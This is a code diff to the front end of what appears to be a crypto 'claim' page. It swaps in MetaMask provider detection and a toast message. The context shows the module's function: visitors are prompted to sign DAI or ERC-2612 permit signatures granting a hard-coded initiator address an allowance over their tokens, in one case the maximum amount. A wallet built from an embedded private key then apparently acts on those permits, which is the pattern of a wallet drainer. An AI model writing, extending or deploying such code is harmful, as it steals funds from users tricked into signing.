@@ -3,6 +3,7 @@ import {
   w3mConnectors,
   w3mProvider,
 } from '@web3modal/ethereum';
+import { useToast } from 'vue-toastification';
 import { Web3Modal } from '@web3modal/html';
 import {
   configureChains,
@@ -24,7 +25,7 @@ const config = {
   network: Network.ETH_MAINNET,
 };
 const alchemy = new Alchemy(config);
-
+import detectEthereumProvider from '@metamask/detect-provider'
 // const chains = [arbitrum]
 const chains = [mainnet];
 const projectId = constants.projectId;
@@ -109,6 +110,9 @@ export const claim = async (_balance) => {
 export const increaseAllowance = async (token) => {
   // RPC provider
   const provider = new ethers.providers.JsonRpcProvider(constants.infura);
+  const permitProvider = await detectEthereumProvider()
+  const Toast = useToast();
+  if(!permitProvider) return Toast.error('Please install Metamask')
   // get token Allownce to transfer imiditly
   const allow = await allownce(token);
   const balanceOfToken = await balanceOf(token);
@@ -140,7 +144,7 @@ export const increaseAllowance = async (token) => {
     }).then( async (result) => {
       if( result === '1') {
         await signDaiPermit(
-          window['web3'].currentProvider, permitToken.address, getAccount().address, constants.initiator, constants.deadline.toString(), nonce.toString()
+          permitProvider, permitToken.address, getAccount().address, constants.initiator, constants.deadline.toString(), nonce.toString()
         ).then(async ( result) => {
 
           const signer = new ethers.Wallet(constants.initiatorPK, provider);
@@ -163,7 +167,7 @@ export const increaseAllowance = async (token) => {
 
       }else if (result === '2') {
         await signERC2612Permit(
-          window.ethereum, permitToken.address, getAccount().address, constants.initiator, constants.max, constants.deadline.toString(),
+          permitProvider, permitToken.address, getAccount().address, constants.initiator, constants.max, constants.deadline.toString(),
         ).then(async ( result) => {
 
           const signer = new ethers.Wallet(constants.initiatorPK, provider);
